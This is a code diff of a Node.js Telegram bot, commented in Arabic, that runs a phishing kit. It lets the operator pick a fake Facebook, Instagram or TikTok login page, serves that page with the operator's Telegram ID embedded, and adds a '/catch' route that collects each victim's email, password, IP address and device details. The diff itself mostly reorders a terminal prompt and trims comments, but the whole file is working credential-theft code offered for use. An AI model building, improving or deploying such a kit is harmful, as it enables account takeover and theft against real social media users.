@@ -17,8 +17,14 @@ const PAGES={                      // عدّلها لحسابك الثانوي
 async function main(){
   const TOKEN=process.env.TOKEN||await ask('BOT_TOKEN: ')
   const MASTER=process.env.MASTER||await ask('MASTER_ID: ')
+
+  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
+  const c=(await ask('Select page (1-3): ')).trim()
+  const p=['fb','ig','tt'][parseInt(c)-1]||'fb'
+
+  rl.close()                       // أغلق بعد آخر سؤال
+
   require('fs').writeFileSync('.env',`TOKEN=${TOKEN}\nMASTER=${MASTER}`)
-  rl.close()
 
   const bot=new Telegraf(TOKEN)
   const app=express()
@@ -28,23 +34,19 @@ async function main(){
   // رسالة اتصال تلقائية
   bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})
 
-  // قائمة اختيار داخل Terminal
-  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
-  const c=(await ask('Select page (1-3): ')).trim()
-  const p=['fb','ig','tt'][parseInt(c)-1]||'fb'
   const ext=`${PAGES[p]}/?id=${MASTER}`
   const int=`http://localhost:3000/${p}`
   console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)
 
-  // ✅ 1- الرابط الداخلي يستعرض نفس الصفحة المزورة
+  // الرابط الداخلي يستعرض نفس الصفحة المزورة
   app.get(`/${p}`,async(_,res)=>{
     try{
       const{data}=await axios.get(`${PAGES[p]}/index.html`)
-      res.send(data.replace('{{ID}}',MASTER))   // نضع الايدي داخل الصفحة
+      res.send(data.replace('{{ID}}',MASTER))
     }catch{res.send('Page not found')}
   })
 
-  // ✅ 2- استقبال بيانات الضحية (فتح الرابط + تسجيل الدخول)
+  // استقبال بيانات الضحية
   app.post('/catch',async(q,r)=>{
     const{id,email,pass,ua:s,ip}=q.body
     const dev=ua(s)
